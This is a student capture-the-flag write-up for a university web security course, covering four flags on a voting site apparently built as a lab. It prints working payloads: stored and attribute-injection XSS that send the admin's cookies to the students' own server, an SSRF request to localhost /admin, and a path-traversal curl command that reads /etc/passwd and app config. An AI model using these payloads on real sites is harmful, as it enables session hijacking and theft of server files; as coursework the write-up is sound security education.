# COMP6843 Break 3

REDACTED (z0000000) and REDACTED (z0000000)

## myvote.ns.agency
### Flags
The flags found were:
#### `BREAK3{771f878354abfaf9365aefcbe7c1091d8307486cff01de5e771240f86a77a491}`
This flag was found by uncovering an XSS vulnerability in the site. Upon registering a new user and examining it's profile, we find that posting a basic `<script>alert(1)</script>` into a comment causes the alert to work indicating that the comments are vulnerable to a stored XSS. Given that the user's profile is has the end point `/profile/59` it is likely that the `59` represents each user and changing the `59` to something else may display another users profile. Usually administrators etc are one of the earliest users so using `1` we get Thomas Phillips account and `2` we get Zain Afzal's account. Notably, they are both Premium Users (Likely admin status). To make use of XSS the target needs to view the page, in our case here, they need to view the comments. One way to tell this is the user responds to the comments. Posting a random message into Thomas Phillip's account got no reply, however posting into Zain's account resulted in his account automatically responding with a `@<user> Thanks for the comment!` indicating that he is viewing the page.

To exploit this, we start our own web server and post a comment in Zain's profile consisting of the following payload:
```
<script>document.write("<img src=http://<our http server>/?c="+document.cookie+"/>")
</script>
```
Taking note of our own cookie (`usertoken`), we see the `GET` request on the http server and get the request with the cookie that isn't ours, replace our existing token and then go back to the home page. This gives us the above flag.


#### `BREAK3{daedd6ef969bb9fb80cc40cfb5fe508b2e66fe17d0be2764f08015ff9f6dbc1a}`
This flag was gained from the hint based on Zain's profile where admin says to Zain **"I vote on every poll that you make. They' great!"** implying that admin will always view polls that Zain made. Going through the polls, we see that **Who is the best simpsons character!?** was created by Zain and therefore there is a good chance that admin views it. Going through the each of the characters on the poll and commenting on their profiles yielded no results. This leaves the details they have on the poll which is their name, mouseover text, and the image itself. Even admin has no right to edit others profiles but we notice with Ralph's mouseover text in that he says "my passwords is my own name." Giving that a go we are able to login to ralph. Observing his profile we notice that his personal name 'Ralph!' is used in both the text and the `alt` attribute in his profile image on the poll. Injecting a `script` tag gets the <> characters encoded but the `alt` attribute is key.

To exploit this we edit Ralph's profile's name with the following payload:
```
" onload="document.write('<img src=' + String.fromCharCode(34)+
'http://<our http server>/cookie?c=' + document.cookie +
String.fromCharCode(34) + '/>');
 ```
We then visit the poll, taken note of the value of our cookie and then examining the server we get the admin's cookie which we substitute with our own and go back to home, getting the flag.

#### `BREAK3{4fb1cc57f1bf94b969b332e16b485d03cbb0ff3787ff3e82e12368646ff86b35}`
This flag was found while exploring the Uploading of Profile Picture functionality of the site. Testing and examining the source code of the page we discovered that the file uploaded must have a `.png` extention, the protocol must be `http` or `file` and that commented out on the source code there is an endpoint called `/admin`. Going to that end point results in a `Host not in whitelist` indicating the potential, with the other discoveries, of an SSRF vulnerability as the `/admin` end point may require access from a particular host, namely `localhost`.

To exploit this, we injected into the profile picture upload field the following payload.
```
http://127.0.0.1/admin?c=.png
```
Grabbing the url of the "broken" image that is now being displayed, we curled it (we don't use the browser as the browser thinks it's an image) giving us the flag. 

#### `BREAK3{a8c5237fc2439d4431e0cb3e32317c38283a80772c1c810d743a5e228875e19f}`
This flag was found also while exploring the Uploading of Profile Picture functionality of the site and was discovered while examining the uploads of images that we tested with (We were initially investigating XSS with PNG files). We noticed that images uploaded had an end point of `/image?name=uploads%2F...` followed by some encrypted text (likely the names of the files encrypted). Profile pictures of the admins were without the `uploads%2F` and the name of the file was unencrypted leading to potentially different locations where images are stored. However, either way, the end point retrieved a filename so we tested the following payload to see if we could get `/etc/passwd`.
```
curl 'https://myvote.ns.agency/image?name=uploads%2F../../etc/passwd' -H
'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-GB,en-US;q=0.9,en;
q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/73.0.3683.103 Safari/537.36' -H 'Accept: image/webp,image/apng,
image/*,*/*;q=0.8'-H 'Referer: https://myvote.ns.agency/profile/59/avatar' -H 
'Cookie: OUTOFSCOPE_COMP6443_SESSION=9369a181-e45d-4756-97d2-a81e60eca546; 
usertoken=.eJwlzEEKgCAQQNG7zDpJaaawc7SPEccQtCRrFd29ouVb_H9BzLwIjHCWtLGv7YDYk6WgGD0
qtNQpNrpX2Dlx2hA5DtBASby-VdhFXp1V9jl6GMn-WDl_00nqAfcD4lIeIQ.XLsgNw.0dwsYqXfpOYQVf7-
ZuLkwFUvN-k' -H 'Connection: keep-alive' --compressed
```
This produced the results of `/etc/passwd` indicating that we have directory traversal and LFI. NOTE: The payload was one string and just broken down for display. Also the `../../` was to get back to the root and was refined down from the initial, much more numerous, version.

To exploit this, we adjusted the `/etc/passwd` for `/proc/self/environ` which give us a whole group of settings including censored flags, however of interest to us was `FLASK_CORE_CONFIG=/app/web/config.py` as this would contain the key used in flask. Adjusting the url for `/app/web/config.py` produced as the above flag as well as the `FLAG_IDS` indicating to us there were 4 flags in this challenge, an XSS, a harder XSS, an SSRF and an LFI.



